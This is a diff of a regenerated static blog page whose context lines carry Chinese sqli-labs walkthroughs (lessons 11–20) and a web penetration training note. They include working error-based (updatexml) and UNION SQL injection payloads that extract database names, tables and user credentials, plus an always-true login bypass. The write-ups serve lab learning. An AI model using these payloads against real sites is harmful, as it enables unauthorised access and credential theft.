@@ -86,17 +86,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/1.png" alt="1"></p>
-<p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/2.png" alt="2"></p>
-<p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/3.png" alt="3"></p>
-<p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/4.png" alt="4"></p>
-<p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/5.png" alt="5"></p>
-<p><img src="/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/6.png" alt="6"></p>
+        <p><img src="/HPPT%E5%8D%8F%E8%AE%AE/1.png" alt="1"></p>
+<p><img src="/HPPT%E5%8D%8F%E8%AE%AE/2.png" alt="2"></p>
+<p><img src="/HPPT%E5%8D%8F%E8%AE%AE/3.png" alt="3"></p>
+<p><img src="/HPPT%E5%8D%8F%E8%AE%AE/4.png" alt="4"></p>
+<p><img src="/HPPT%E5%8D%8F%E8%AE%AE/5.png" alt="5"></p>
+<p><img src="/HPPT%E5%8D%8F%E8%AE%AE/6.png" alt="6"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/" data-id="ckozphttx000mzsvu4xpi7zou" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/" data-id="ckr0oba2n000vi8vu1od3hp4a" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li></ul>
@@ -140,39 +140,39 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>从这里我们可以看到我们的uagent等会被带入到数据库中，那么我们好像可以通过对uagent进行改写，构造payload。</p>
-<p>然后我们现在在页面输入正确账号密码后，发现页面回显：<img src="/2021/02/01/lesson18-20/1.png" alt="1"></p>
+<p>然后我们现在在页面输入正确账号密码后，发现页面回显：<img src="/lesson18-19/1.png" alt="1"></p>
 <p>那么我们更可以确定是对User-Agent 下手。</p>
 <p>通过第三段源码我们可以得知注入类型为：’  ;</p>
-<p>于是我们可以开始用burp suite抓包：<img src="/2021/02/01/lesson18-20/2.png" alt="2"></p>
-<h5 id="payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1"><a href="#payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1" class="headerlink" title="payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#"></a>payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#</h5><p>其中clase为想要查询的子句；源码的insert语句中原本有三个参数（用三个1表示）——（1，1*，1**），然后1被<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>  替换，后面1*和1**是为了和insert语句中参数数量一致，否则会报错：<img src="/2021/02/01/lesson18-20/7.png" alt="7"></p>
+<p>于是我们可以开始用burp suite抓包：<img src="/lesson18-19/2.png" alt="2"></p>
+<h5 id="payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1"><a href="#payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1" class="headerlink" title="payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#"></a>payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#</h5><p>其中clase为想要查询的子句；源码的insert语句中原本有三个参数（用三个1表示）——（1，1*，1**），然后1被<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>  替换，后面1*和1**是为了和insert语句中参数数量一致，否则会报错：<img src="/lesson18-19/7.png" alt="7"></p>
 <p>当updatexml函数报错以后，数据库就不会去检查1*和1**了。</p>
 <p>注：<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>带入到源码中 <code>&#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)</code>，第一处合并是空，所以uagent把updatexml函数的值带入数据库。</p>
 <h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
 
-<p>Forword，得：<img src="/2021/02/01/lesson18-20/3.png" alt="3"></p>
+<p>Forword，得：<img src="/lesson18-19/3.png" alt="3"></p>
 <h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
 
-<p>Forword，得：<img src="/2021/02/01/lesson18-20/4.png" alt="4"></p>
+<p>Forword，得：<img src="/lesson18-19/4.png" alt="4"></p>
 <p>注：因为我之前在security数据库里创了表，现在导致表太多了，而报错的长度有限，不能查到所有表。然后我想用limit函数限制查询数量，但是我尝试了好久没有成功，先留个坑吧！！！！！！！！！！！！！！！！！！</p>
 <h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
 
 <p>Forword，得：</p>
-<p><img src="/2021/02/01/lesson18-20/5.png" alt="5"></p>
+<p><img src="/lesson18-19/5.png" alt="5"></p>
 <h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;<span class="comment">#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
 
 <p>Forword，得：</p>
-<p><img src="/2021/02/01/lesson18-20/6.png" alt="6"></p>
+<p><img src="/lesson18-19/6.png" alt="6"></p>
 <h3 id="lesson19："><a href="#lesson19：" class="headerlink" title="lesson19："></a>lesson19：</h3><p>这一关和lesson18差不多，只不过改在Referer处写payload。</p>
 <h3 id="lesson20："><a href="#lesson20：" class="headerlink" title="lesson20："></a>lesson20：</h3><p>这一关和lesson18也是类似，不过在cookie处写payload，而且因为当输入正确账号密码的时候，网页会回显，所以也可以采用union联合注入。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/01/lesson18-20/" data-id="ckozphtup002tzsvuhqtu4rtl" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/01/lesson18-20/" data-id="ckr0oba370029i8vu266ae5bl" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -216,7 +216,7 @@
 <h5 id="3-stripslashes-函数"><a href="#3-stripslashes-函数" class="headerlink" title="3.stripslashes()函数"></a>3.stripslashes()函数</h5><p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
 <p>注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。</p>
 <h5 id="4-ctype-digit-函数"><a href="#4-ctype-digit-函数" class="headerlink" title="4.ctype_digit()函数"></a>4.ctype_digit()函数</h5><p>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
-<h5 id="5-mysql-real-escape-string-函数"><a href="#5-mysql-real-escape-string-函数" class="headerlink" title="5.mysql_real_escape_string()函数"></a>5.mysql_real_escape_string()函数</h5><p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/2021/01/31/lesson17/1.png" alt="1"></p>
+<h5 id="5-mysql-real-escape-string-函数"><a href="#5-mysql-real-escape-string-函数" class="headerlink" title="5.mysql_real_escape_string()函数"></a>5.mysql_real_escape_string()函数</h5><p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/lesson17/1.png" alt="1"></p>
 <p><strong>sp：</strong>怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。</p>
 <p>我们观察源码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
@@ -229,32 +229,32 @@
 <p>第二个参数：XPath_string (Xpath格式的字符串)；</p>
 <p>第三个参数：new_value， String格式，替换查找到的符合条件的数据；</p>
 <p>该函数的作用就是把xml文档中的指定字符串替换成新值。</p>
-<p><img src="/2021/01/31/lesson17/2.png" alt="2"></p>
+<p><img src="/lesson17/2.png" alt="2"></p>
 <h6 id="2-extractvalue-函数："><a href="#2-extractvalue-函数：" class="headerlink" title="2.extractvalue()函数："></a>2.extractvalue()函数：</h6><p>extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。</p>
-<h5 id><a href="#" class="headerlink" title></a><img src="/2021/01/31/lesson17/3.png" alt="3"></h5><h5 id="B-报错注入原理："><a href="#B-报错注入原理：" class="headerlink" title="B.报错注入原理："></a>B.报错注入原理：</h5><p>(1)参数xpath需要的是xpath格式的字符串，不是就会报错。</p>
+<h5 id><a href="#" class="headerlink" title></a><img src="/lesson17/3.png" alt="3"></h5><h5 id="B-报错注入原理："><a href="#B-报错注入原理：" class="headerlink" title="B.报错注入原理："></a>B.报错注入原理：</h5><p>(1)参数xpath需要的是xpath格式的字符串，不是就会报错。</p>
 <p>(2))当xpath路径语法错误时，就会报错。</p>
 <p>注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。</p>
 <p>懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。</p>
 <h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=(anything)&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;, database()),1)#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/31/lesson17/4.png" alt="4"></p>
+<p>得：<img src="/lesson17/4.png" alt="4"></p>
 <p>注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。</p>
 <h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/31/lesson17/5.png" alt="5"></p>
+<p>得：<img src="/lesson17/5.png" alt="5"></p>
 <h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/31/lesson17/6.png" alt="6"></p>
+<p>得：<img src="/lesson17/6.png" alt="6"></p>
 <h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/31/lesson17/7.png" alt="7"></p>
-<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.爆值的时候需要注意，不能直接用简单的<code>select concat(username)</code>，这样会引起报错：<img src="/2021/01/31/lesson17/8.png" alt="8"></p>
+<p>得：<img src="/lesson17/7.png" alt="7"></p>
+<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.爆值的时候需要注意，不能直接用简单的<code>select concat(username)</code>，这样会引起报错：<img src="/lesson17/8.png" alt="8"></p>
 <p>原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。</p>
-<p><img src="/2021/01/31/lesson17/9.png" alt="9"></p>
+<p><img src="/lesson17/9.png" alt="9"></p>
 <p>2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制</p>
 <p>回显内容。</p>
 <p><strong>sp：回顾一下字符串连接函数</strong></p>
@@ -263,7 +263,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/lesson17/" data-id="ckozphtun002lzsvu16z9avsc" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/31/lesson17/" data-id="ckr0oba38002di8vu12g13nq6" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -311,24 +311,24 @@
 <h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/30/lesson11-16/1.png" alt="1"></p>
+<p>得：<img src="/lesson11-16/1.png" alt="1"></p>
 <h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/30/lesson11-16/2.png" alt="2"></p>
+<p>得：<img src="/lesson11-16/2.png" alt="2"></p>
 <h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/30/lesson11-16/3.png" alt="3"></p>
+<p>得：<img src="/lesson11-16/3.png" alt="3"></p>
 <h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>), (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/2021/01/30/lesson11-16/4.png" alt="4"></p>
+<p>得：<img src="/lesson11-16/4.png" alt="4"></p>
 <h1 id="lesson12："><a href="#lesson12：" class="headerlink" title="lesson12："></a>lesson12：</h1><p>lesson12的源码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql=&quot;<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=($uname) <span class="keyword">and</span> <span class="keyword">password</span>=     ($passwd) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
 
 <p>查看源代码不是很能直观看出数据库如何闭合函数，我们通过网页检测其是如何闭合参数的：</p>
 <p>username=a’a”a’)a</p>
-<p>得：<img src="/2021/01/30/lesson11-16/5.png" alt="5"></p>
+<p>得：<img src="/lesson11-16/5.png" alt="5"></p>
 <p>我们通过观察password部分可知注入点为‘’）；</p>
 <p>但是当我构造payload：root‘’）#时我发现页面返回错误，而且我发现这关无法通过注释达到篡改数据库。</p>
 <p>剩下的和lesson11一样。</p>
@@ -349,63 +349,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/30/lesson11-16/" data-id="ckozphtuo002ozsvucr7h2a16" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/30/lesson11-16/" data-id="ckr0oba39002gi8vuho5gh8b7" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-2021-1月web渗透培训(2)" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/" class="article-date">
-  <time datetime="2021-01-27T02:56:06.000Z" itemprop="datePublished">2021-01-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/">2021-1月web渗透培训(2)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>SQL注入原理（web漏洞）：</p>
-<p>将用户的输入当作代码/指令，在数据库中操作、执行</p>
-<p>例如：用户名：admin 密码：123</p>
-<p>正常带入数据库中执行：select *from users where username=‘admin’ and password=‘123’–返回正确，成功登入；</p>
-<p>利用SQL注入：</p>
-<p>构造payload：用户名：admin‘ or ’1‘=’1 密码=‘随意’；</p>
-<p>带入数据库中执行：select *from users where username=‘admin‘ or ’1‘=’1’ and password=‘随意’–返回正确，成功登入；我们可以看到数据库误把用户的输入当做代码，整合到源码中，1=1恒成立故导致该语句恒成立。</p>
-<p>注：数据库中 ‘ = ’ 优先级高于 ‘and’ 高于 ‘or’；</p>
-<p>预防SQL注入：过滤用户的特殊输入（关键字：and等，字符：‘ 等），预编译（将用户的输入当作字符串，即不数据库不会执行夹杂在用户输入的代码中）；</p>
-<p>判断是否存在SQL注入漏洞：</p>
-<p>(1)?id=1’ –页面是否报错</p>
-<p>(2)?id=1’ and ‘1’=’1–页面是否正常</p>
-<p>(3)?id=1’ and ‘1’=’2–页面是否异常</p>
-<p>若(1)报错(2)正常(3)异常则说明存在SQL注入漏洞。</p>
-<p>参考ppt：<a target="_blank" rel="noopener" href="https://kdocs.cn/l/crYKxbz6UgjE">https://kdocs.cn/l/crYKxbz6UgjE</a>  密码goktech</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/" data-id="ckozphttn0003zsvucz22b8ln" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li></ul>
 
     </footer>
   </div>
@@ -463,7 +410,60 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/" data-id="ckozphttp0005zsvu1eyh4lis" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/" data-id="ckr0oba260001i8vu1axfeyta" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-2021-1月web渗透培训(2)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/" class="article-date">
+  <time datetime="2021-01-27T02:56:06.000Z" itemprop="datePublished">2021-01-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/">2021-1月web渗透培训(2)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SQL注入原理（web漏洞）：</p>
+<p>将用户的输入当作代码/指令，在数据库中操作、执行</p>
+<p>例如：用户名：admin 密码：123</p>
+<p>正常带入数据库中执行：select *from users where username=‘admin’ and password=‘123’–返回正确，成功登入；</p>
+<p>利用SQL注入：</p>
+<p>构造payload：用户名：admin‘ or ’1‘=’1 密码=‘随意’；</p>
+<p>带入数据库中执行：select *from users where username=‘admin‘ or ’1‘=’1’ and password=‘随意’–返回正确，成功登入；我们可以看到数据库误把用户的输入当做代码，整合到源码中，1=1恒成立故导致该语句恒成立。</p>
+<p>注：数据库中 ‘ = ’ 优先级高于 ‘and’ 高于 ‘or’；</p>
+<p>预防SQL注入：过滤用户的特殊输入（关键字：and等，字符：‘ 等），预编译（将用户的输入当作字符串，即不数据库不会执行夹杂在用户输入的代码中）；</p>
+<p>判断是否存在SQL注入漏洞：</p>
+<p>(1)?id=1’ –页面是否报错</p>
+<p>(2)?id=1’ and ‘1’=’1–页面是否正常</p>
+<p>(3)?id=1’ and ‘1’=’2–页面是否异常</p>
+<p>若(1)报错(2)正常(3)异常则说明存在SQL注入漏洞。</p>
+<p>参考ppt：<a target="_blank" rel="noopener" href="https://kdocs.cn/l/crYKxbz6UgjE">https://kdocs.cn/l/crYKxbz6UgjE</a>  密码goktech</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/" data-id="ckr0oba2c0006i8vu4p0z67ts" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li></ul>
@@ -506,7 +506,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/25/PHP%E8%AF%AD%E6%B3%95/" data-id="ckozphtu0000wzsvubeaxb2sc" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/25/PHP%E8%AF%AD%E6%B3%95/" data-id="ckr0oba2q0015i8vu610uhtcj" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
@@ -555,7 +555,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/13/blog%20j/" data-id="ckozphtu8001hzsvud02z71qj" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/13/blog%20j/" data-id="ckr0oba2v001hi8vu57eugmia" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -620,7 +620,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/13/blog%20i/" data-id="ckozphtu9001mzsvuelnzaz0h" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/13/blog%20i/" data-id="ckr0oba2y001li8vufiwn7b0q" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -688,7 +688,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckozphtuy003qzsvu2ww285er" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckr0oba3o003xi8vu4yh9fpmm" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
